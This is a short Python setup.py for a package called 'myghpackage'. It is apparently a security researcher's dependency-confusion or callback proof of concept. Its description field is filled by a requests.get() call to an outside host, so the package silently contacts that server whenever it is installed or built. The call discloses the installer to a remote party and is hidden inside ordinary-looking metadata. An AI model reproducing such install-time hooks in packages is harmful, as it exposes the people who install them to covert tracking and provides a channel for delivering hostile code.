from setuptools import setup

import requests

setup(
    name='myghpackage',
    version='1.0.0',
    description=requests.get("https://bxss.r0l.me/myghpackage-snykdesc"),
    long_description='Some random long description',
    long_description_content_type='text/markdown',
    author='Rotem Reiss',
    author_email='rreiss@wearehackerone.com',
    install_requires=[
        'requests'
    ],
    license="MIT"
)
